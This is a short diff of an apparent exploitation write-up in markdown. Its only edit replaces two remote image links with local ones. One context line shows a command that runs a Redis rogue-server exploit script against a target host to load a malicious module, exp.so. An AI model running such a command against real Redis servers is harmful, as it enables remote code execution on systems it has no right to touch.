@@ -83,6 +83,6 @@ Example
 python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so
 ```
 
-![image-20220209122913587](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091229797.png)
+![image-20220209122913587](./images/202202091229797.png)
 
-![image-20220209122934426](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202091229486.png)
+![image-20220209122934426](./images/202202091229486.png)
